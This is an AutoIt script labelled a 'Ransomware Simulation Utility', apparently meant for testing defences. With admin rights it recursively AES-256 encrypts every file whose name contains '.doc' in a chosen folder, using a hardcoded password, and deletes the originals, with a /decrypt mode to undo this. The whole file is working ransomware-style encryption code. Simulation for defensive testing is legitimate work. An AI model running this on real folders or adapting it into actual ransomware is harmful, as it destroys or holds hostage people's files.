#include <FileConstants.au3>
#include <MsgBoxConstants.au3>
#include <WinAPIFiles.au3>
#include <Crypt.au3>
#include <Array.au3>
#include <File.au3>

#RequireAdmin

$sPasswordRead = "testmal"
$iAlgorithm = $CALG_AES_256
$ExtensionToEncrypt = ".doc"

Func _ArgParsing(ByRef $ops, ByRef $folderPath)
	$V_Arg = "Valid Arguments are:" & @LF
	$V_Arg = $V_Arg & "    /encrypt - Recursively encrypt data in a folder path" & @LF
	$V_Arg = $V_Arg & "    /decrypt - Recursively decrypt data in a folder path" & @LF
	$V_Arg = $V_Arg & "    <FolderPath>" & @LF
	
	If $CmdLine[0] <> 2 Then
		MsgBox(1,"Arguments Parsing","Wrong input format!")
		MsgBox(1,"Ransomware Simulation Utility", "" & $v_Arg)
		Exit(1)
	EndIf
	; retrieve commandline parameters
	For $x = 1 to $CmdLine[0]
	   Select
		  Case $CmdLine[$x] = "/encrypt"
			 $ops = 1
		  Case $CmdLine[$x] = "/decrypt"
			 $ops = 2
		  Case Else
			 $folderPath = $CmdLine[$x]
		EndSelect
	Next
	
	$FileAttributes = FileGetAttrib($folderPath)
	If $ops<1 or $ops >2 or not StringInStr($FileAttributes,"D")  Then
		MsgBox(1,"Arguments Parsing","Wrong input format!")
	EndIf
	$folderPath = _PathFull($folderPath)
EndFunc

Func EncryptFolder($SourceFolder)
    Local $Search
    Local $File
    Local $FileAttributes
    Local $FullFilePath  
	
    $Search = FileFindFirstFile($SourceFolder & "\*.*")  
    While 1
        If $Search = -1 Then
            ExitLoop
        EndIf
        
        $File = FileFindNextFile($Search)
        If @error Then ExitLoop
        $FullFilePath = $SourceFolder & "\" & $File
        $FileAttributes = FileGetAttrib($FullFilePath)
        
        If StringInStr($FileAttributes,"D") Then 
            EncryptFolder($FullFilePath)
        Else
            If StringInStr($File,$ExtensionToEncrypt) Then 
				_Crypt_EncryptFile($FullFilePath, $FullFilePath & ".cryptest", $sPasswordRead, $iAlgorithm)
				FileDelete ($FullFilePath)
			EndIf
        EndIf
    WEnd
    FileClose($Search)
EndFunc

Func DecryptFolder($SourceFolder)
    Local $Search
    Local $File
    Local $FileAttributes
    Local $FullFilePath  
    $Search = FileFindFirstFile($SourceFolder & "\*.*")  
    While 1
        If $Search = -1 Then
            ExitLoop
        EndIf
        
        $File = FileFindNextFile($Search)
        If @error Then ExitLoop
        
        $FullFilePath = $SourceFolder & "\" & $File
        $FileAttributes = FileGetAttrib($FullFilePath)
        
        If StringInStr($FileAttributes,"D") Then 
            DecryptFolder($FullFilePath)
        Else
            If StringInStr($File,".cryptest") Then 
				_Crypt_DecryptFile($FullFilePath, StringRegExpReplace($FullFilePath, "\.cryptest$", ""), $sPasswordRead, $iAlgorithm)
				FileDelete ($FullFilePath)
			EndIf
        EndIf
    WEnd
    FileClose($Search)
EndFunc


Local $ops = 3, $sourceRead = ""
_ArgParsing($ops,$sourceRead)


If $ops = 1 Then
	EncryptFolder($sourceRead)
Else
	DecryptFolder($sourceRead)
EndIf
